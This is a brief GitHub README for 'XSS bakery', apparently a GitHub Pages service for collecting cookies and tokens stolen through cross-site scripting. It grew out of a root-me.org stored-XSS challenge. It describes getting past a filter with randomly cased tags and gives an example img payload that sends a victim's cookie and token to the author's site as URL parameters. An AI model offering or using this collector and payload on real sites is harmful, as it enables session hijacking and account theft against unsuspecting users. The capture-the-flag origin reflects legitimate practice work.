# XSS bakery

<p>
  <img src="https://github.com/jasiukiewicztymon/xss-bakery/assets/73474137/0ecdbd9f-1ea5-41c8-981e-343c5cfffe43" align=left width=400>
  <b>XSS bakery</b> is a github pages services to create a session and create your cookie fetch in some clicks..
  <h2>Why use this?</h2>
  I had the idea to create this repository while solving the stored XSS on www.root-me.org. While the html is preprocessed in raw mode we can inject 
  <i>js</i> inside the input. The XSS security can be by passed with randomly cased written tags, and src attribute with pointing to this website and 
  as URL variable <b>c</b>, the cookie and <b>t</b>, the token. 

  ***Example:*** 
  
  ```html
  <ImG src="https://jasiukiewicztymon.github.com/xss-bakery/index.html?c=<COOKIE>&t=<TOKEN>">
  ```
</p>

